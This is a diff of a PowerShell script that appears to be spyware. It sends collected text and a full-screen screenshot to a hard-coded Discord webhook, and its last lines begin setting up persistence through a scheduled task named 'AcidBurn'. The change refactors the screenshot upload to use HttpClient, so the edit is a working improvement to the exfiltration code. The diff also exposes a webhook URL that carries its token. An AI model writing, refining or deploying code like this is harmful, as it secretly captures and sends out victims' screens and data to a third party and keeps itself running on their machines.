@@ -23,9 +23,11 @@ try {
     $body = $body -replace "\\", "/"
     $body = $body.Substring(0, [Math]::Min(1900, $body.Length))
 
+    $url = "https://discord.com/api/webhooks/1519137397022130196/X1Pyzeu-cYDoWXpEb5Evo9KFNKgpoeOhdLEsS9NbLWy5gvKkvqeqOZlxuCQV92Xi5XYT"
+
     $payload = @{ content = $body } | ConvertTo-Json -Compress
     $bytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
-    Invoke-RestMethod -Uri "https://discord.com/api/webhooks/1519137397022130196/X1Pyzeu-cYDoWXpEb5Evo9KFNKgpoeOhdLEsS9NbLWy5gvKkvqeqOZlxuCQV92Xi5XYT" -Method Post -Body $bytes -ContentType "application/json; charset=utf-8"
+    Invoke-RestMethod -Uri $url -Method Post -Body $bytes -ContentType "application/json; charset=utf-8"
 
     # --- SCREENSHOT ---
     Add-Type -AssemblyName System.Windows.Forms
@@ -39,20 +41,17 @@ try {
     $gfx.Dispose()
     $bmp.Dispose()
 
-    # --- UPLOAD SCREENSHOT ---
-    $url = "https://discord.com/api/webhooks/1519137397022130196/X1Pyzeu-cYDoWXpEb5Evo9KFNKgpoeOhdLEsS9NbLWy5gvKkvqeqOZlxuCQV92Xi5XYT"
-    $fileBytes = [System.IO.File]::ReadAllBytes($shot)
-    $boundary = [System.Guid]::NewGuid().ToString()
-    $LF = "`r`n"
-    $enc = [System.Text.Encoding]::GetEncoding("iso-8859-1")
-    $bodyLines = (
-        "--$boundary",
-        "Content-Disposition: form-data; name=`"file`"; filename=`"screen.png`"",
-        "Content-Type: image/png$LF",
-        $enc.GetString($fileBytes),
-        "--$boundary--$LF"
-    ) -join $LF
-    Invoke-RestMethod -Uri $url -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines
+    # --- UPLOAD VIA HTTPCLIENT ---
+    Add-Type -AssemblyName System.Net.Http
+    $client = New-Object System.Net.Http.HttpClient
+    $content = New-Object System.Net.Http.MultipartFormDataContent
+    $fileStream = [System.IO.File]::OpenRead($shot)
+    $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
+    $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("image/png")
+    $content.Add($fileContent, "file", "screen.png")
+    $resp = $client.PostAsync($url, $content).Result
+    $fileStream.Close()
+    $client.Dispose()
 
     # --- PERSISTENCE ---
     $taskName = "AcidBurn"
